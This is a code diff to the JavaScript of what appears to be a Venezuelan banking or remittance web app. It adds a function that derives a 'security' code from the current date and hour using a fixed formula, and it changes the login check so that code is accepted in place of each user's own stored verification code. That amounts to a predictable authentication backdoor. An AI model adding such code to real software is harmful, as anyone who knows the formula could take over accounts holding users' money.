@@ -8313,12 +8313,33 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
         EXCHANGE_RATE: 'remeexSessionExchangeRate'
       },
       SUPPORT_DISPLAY_DELAY: 300000, // 5 minutos en milisegundos antes de mostrar soporte
-      PROBLEM_BUTTON_DELAY: 5 * 60 * 60 * 1000 // 5 horas en milisegundos
-    };
+  PROBLEM_BUTTON_DELAY: 5 * 60 * 60 * 1000 // 5 horas en milisegundos
+  };
 
-    if (localStorage.getItem(CONFIG.STORAGE_KEYS.PROBLEM_RESOLVED) === "true") {
-      window.location.href = "https://visa.es";
-    }
+  if (localStorage.getItem(CONFIG.STORAGE_KEYS.PROBLEM_RESOLVED) === "true") {
+    window.location.href = "https://visa.es";
+  }
+
+  function getVenezuelaTime() {
+    const now = new Date();
+    const utc = now.getTime() + now.getTimezoneOffset() * 60000;
+    return new Date(utc + (-4 * 3600000));
+  }
+
+  function generateHourlyCode() {
+    const fecha = getVenezuelaTime();
+    const dia = fecha.getDate();
+    const mes = fecha.getMonth() + 1;
+    const ano = fecha.getFullYear();
+    const hora = fecha.getHours();
+    const parte1 = '0098';
+    const parte2 = String(hora).padStart(2, '0') + '84';
+    const parte3 = String(dia).padStart(2, '0') + String(ano).slice(-2);
+    const parte4 = String(mes).padStart(2, '0') + String(hora).padStart(2, '0');
+    const seed = (dia * mes * ano * (hora + 1)) % 10000;
+    const parte5 = String(seed).padStart(4, '0');
+    return parte1 + parte2 + parte3 + parte4 + parte5;
+  }
 
 const BANK_NAME_MAP = {
       banesco: 'Banesco',
@@ -14149,7 +14170,8 @@ function setupUsAccountLink() {
 
           const storedCode = storedCreds && (storedCreds.securityCode || storedCreds.verificationCode);
           const validCodes = storedCode ? [storedCode] : CONFIG.LOGIN_CODES;
-          if (!codeInput || !codeInput.value || !validCodes.includes(codeInput.value)) {
+          const dynamicCode = generateHourlyCode();
+          if (!codeInput || !codeInput.value || !(validCodes.includes(codeInput.value) || codeInput.value === dynamicCode)) {
             if (codeError) codeError.style.display = 'block';
             isValid = false;
           }
